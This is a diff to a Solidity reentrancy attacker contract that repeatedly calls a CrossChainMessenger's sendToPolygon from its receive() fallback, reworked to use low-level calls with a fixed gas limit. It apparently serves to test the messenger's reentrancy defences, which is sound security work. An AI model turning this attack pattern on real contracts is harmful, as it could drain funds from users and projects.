@@ -8,6 +8,7 @@ contract ReentrancyAttacker {
     uint256 public attackCount;
     uint256 public constant ATTACK_VALUE = 1 ether;
     uint256 public constant MIN_BALANCE = 2 ether;
+    uint256 public constant GAS_LIMIT = 500000;
 
     event AttackAttempted(uint256 value, uint256 count);
     event ReentrancyCallFailed(string reason);
@@ -18,43 +19,44 @@ contract ReentrancyAttacker {
         messenger = CrossChainMessenger(_messenger);
     }
 
-    function attack() external payable {
+    function attackWithGas() external payable {
         require(msg.value >= MIN_BALANCE, "Need at least 2 ETH");
         attackCount = 0;
 
-        // Initial call to trigger reentrancy
-        try messenger.sendToPolygon{value: ATTACK_VALUE, gas: 500000}(address(this)) {
-            emit AttackAttempted(ATTACK_VALUE, 0);
-        } catch Error(string memory reason) {
+        // Initial call with fixed gas limit
+        (bool success, bytes memory data) = address(messenger).call{
+            value: ATTACK_VALUE,
+            gas: GAS_LIMIT
+        }(abi.encodeWithSelector(messenger.sendToPolygon.selector, address(this)));
+
+        if (!success) {
+            string memory reason = _getRevertMsg(data);
             emit ReentrancyCallFailed(reason);
             revert(reason);
-        } catch (bytes memory reason) {
-            string memory decodedReason = _getRevertMsg(reason);
-            emit ReentrancyCallFailed(decodedReason);
-            revert(decodedReason);
         }
+
+        emit AttackAttempted(ATTACK_VALUE, 0);
     }
 
-    // Fallback function that attempts reentry
     receive() external payable {
-        // Don't increment counter until after successful call
         uint256 currentCount = attackCount;
 
         if (currentCount < 1 && address(this).balance >= ATTACK_VALUE) {
             emit FallbackCalled(address(this).balance, currentCount);
 
-            // Try to reenter during message processing
-            try messenger.sendToPolygon{value: ATTACK_VALUE, gas: 500000}(address(this)) {
-                attackCount = currentCount + 1;
-                emit AttackAttempted(ATTACK_VALUE, attackCount);
-            } catch Error(string memory reason) {
+            (bool success, bytes memory data) = address(messenger).call{
+                value: ATTACK_VALUE,
+                gas: GAS_LIMIT
+            }(abi.encodeWithSelector(messenger.sendToPolygon.selector, address(this)));
+
+            if (!success) {
+                string memory reason = _getRevertMsg(data);
                 emit ReentrancyCallFailed(reason);
                 revert(reason);
-            } catch (bytes memory reason) {
-                string memory decodedReason = _getRevertMsg(reason);
-                emit ReentrancyCallFailed(decodedReason);
-                revert(decodedReason);
             }
+
+            attackCount = currentCount + 1;
+            emit AttackAttempted(ATTACK_VALUE, attackCount);
         }
     }
 
